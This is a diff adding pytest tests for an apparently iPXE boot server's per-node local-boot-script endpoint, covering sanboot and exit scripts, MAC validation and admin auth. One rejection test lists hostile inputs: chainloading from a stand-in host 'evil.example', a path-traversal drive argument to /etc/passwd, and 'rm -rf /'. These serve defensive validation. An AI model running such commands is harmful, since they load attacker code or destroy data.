@@ -47,7 +47,8 @@ def test_boot_valid_mac_creates_node_returns_local_disk(client):
     assert r.status_code == 200
     body = r.get_data(as_text=True)
     assert body.startswith("#!ipxe")
-    assert "sanboot" in body and "0x80" in body
+    # Default local boot script is "exit" - no explicit sanboot command.
+    assert "exit" in body
     assert "kernel" not in body
 
     r2 = client.get("/nodes")
@@ -281,3 +282,126 @@ def test_admin_auth_post_delete_reinstall_required(client, monkeypatch):
     assert r3.status_code == 200
     r4 = client.delete(f"/nodes/{mac}/reinstall", headers={"Authorization": "Bearer secret"})
     assert r4.status_code == 200
+
+
+def test_nodes_includes_local_boot_script_field(client):
+    """GET /nodes includes local_boot_script in every node entry (null by default)."""
+    client.get("/boot", query_string={"mac": "aa:bb:cc:dd:ee:ff"})
+    nodes = client.get("/nodes").get_json()["nodes"]
+    assert len(nodes) == 1
+    assert "local_boot_script" in nodes[0]
+    assert nodes[0]["local_boot_script"] is None
+
+
+def test_set_local_boot_script_sanboot_bios(client):
+    """PUT /nodes/<mac>/local-boot-config stores sanboot 0x80; next /boot returns that command."""
+    mac = "aa:bb:cc:dd:ee:ff"
+    script = "sanboot --no-describe --drive 0x80"
+    r = client.put(f"/nodes/{mac}/local-boot-config", json={"script": script})
+    assert r.status_code == 200
+    assert r.get_json() == {"mac": mac, "local_boot_script": script}
+
+    # /boot now returns the sanboot command instead of exit.
+    boot_body = client.get("/boot", query_string={"mac": mac}).get_data(as_text=True)
+    assert "sanboot" in boot_body
+    assert "0x80" in boot_body
+
+
+def test_set_local_boot_script_sanboot_uefi_drive_zero(client):
+    """sanboot --no-describe --drive 0 (UEFI first disk) is a valid script."""
+    mac = "bb:cc:dd:ee:ff:00"
+    script = "sanboot --no-describe --drive 0"
+    r = client.put(f"/nodes/{mac}/local-boot-config", json={"script": script})
+    assert r.status_code == 200
+    assert r.get_json()["local_boot_script"] == script
+
+
+def test_set_local_boot_script_sanboot_uefi_second_disk(client):
+    """sanboot with drive 1 selects the UEFI second disk."""
+    mac = "cc:dd:ee:ff:00:11"
+    r = client.put(f"/nodes/{mac}/local-boot-config", json={"script": "sanboot --no-describe --drive 1"})
+    assert r.status_code == 200
+
+
+def test_set_local_boot_script_sanboot_with_filename(client):
+    """sanboot with --filename for a specific EFI binary is accepted."""
+    mac = "dd:ee:ff:00:11:22"
+    script = r"sanboot --no-describe --drive 0 --filename \EFI\ubuntu\grubx64.efi"
+    r = client.put(f"/nodes/{mac}/local-boot-config", json={"script": script})
+    assert r.status_code == 200
+
+
+def test_set_local_boot_script_exit_explicit(client):
+    """Setting script to "exit" is explicitly valid."""
+    mac = "ee:ff:00:11:22:33"
+    r = client.put(f"/nodes/{mac}/local-boot-config", json={"script": "exit"})
+    assert r.status_code == 200
+
+
+def test_set_local_boot_script_invalid_rejects(client):
+    """Unknown or dangerous script values return 400."""
+    mac = "ff:00:11:22:33:44"
+    for bad in [
+        "kernel http://evil.example/linux",
+        "chain http://evil.example/script.ipxe",
+        "sanboot --unknown-flag",
+        "sanboot --drive ../../../../etc/passwd",
+        "rm -rf /",
+        "",
+    ]:
+        r = client.put(f"/nodes/{mac}/local-boot-config", json={"script": bad})
+        assert r.status_code == 400, f"Expected 400 for script={bad!r}, got {r.status_code}"
+
+
+def test_set_local_boot_script_missing_key_returns_400(client):
+    """PUT /nodes/<mac>/local-boot-config without 'script' key returns 400."""
+    mac = "aa:bb:cc:dd:ee:ff"
+    r = client.put(f"/nodes/{mac}/local-boot-config", json={"command": "exit"})
+    assert r.status_code == 400
+    assert "script" in r.get_json()["error"].lower()
+
+
+def test_delete_local_boot_script_resets_to_exit(client):
+    """DELETE /nodes/<mac>/local-boot-config clears the script; /boot falls back to exit."""
+    mac = "aa:bb:cc:dd:ee:ff"
+    client.put(f"/nodes/{mac}/local-boot-config", json={"script": "sanboot --no-describe --drive 0x80"})
+
+    r = client.delete(f"/nodes/{mac}/local-boot-config")
+    assert r.status_code == 200
+    assert r.get_json() == {"mac": mac, "local_boot_script": None}
+
+    # After clearing, /boot must return plain exit again.
+    boot_body = client.get("/boot", query_string={"mac": mac}).get_data(as_text=True)
+    assert "exit" in boot_body
+    assert "sanboot" not in boot_body
+
+
+def test_local_boot_invalid_mac_returns_400(client):
+    """PUT/DELETE local-boot-config with invalid MAC returns 400."""
+    r1 = client.put("/nodes/invalid/local-boot-config", json={"script": "exit"})
+    r2 = client.delete("/nodes/invalid/local-boot-config")
+    assert r1.status_code == 400
+    assert r2.status_code == 400
+
+
+def test_set_local_boot_creates_node_if_missing(client):
+    """PUT /nodes/<mac>/local-boot-config creates the node entry if it doesn't exist yet."""
+    mac = "11:22:33:44:55:77"
+    r = client.put(f"/nodes/{mac}/local-boot-config", json={"script": "sanboot --no-describe --drive 0"})
+    assert r.status_code == 200
+    nodes = client.get("/nodes").get_json()["nodes"]
+    assert any(n["mac"] == mac and n["local_boot_script"] == "sanboot --no-describe --drive 0" for n in nodes)
+
+
+def test_admin_auth_required_for_local_boot(client, monkeypatch):
+    """PUT/DELETE local-boot-config require Bearer token when ADMIN_API_KEY is set."""
+    monkeypatch.setattr("app.routes.common.ADMIN_API_KEY", "secret")
+    mac = "aa:bb:cc:dd:ee:ff"
+    r1 = client.put(f"/nodes/{mac}/local-boot-config", json={"script": "exit"})
+    r2 = client.delete(f"/nodes/{mac}/local-boot-config")
+    assert r1.status_code == 401
+    assert r2.status_code == 401
+
+    r3 = client.put(f"/nodes/{mac}/local-boot-config", json={"script": "exit"},
+                    headers={"Authorization": "Bearer secret"})
+    assert r3.status_code == 200
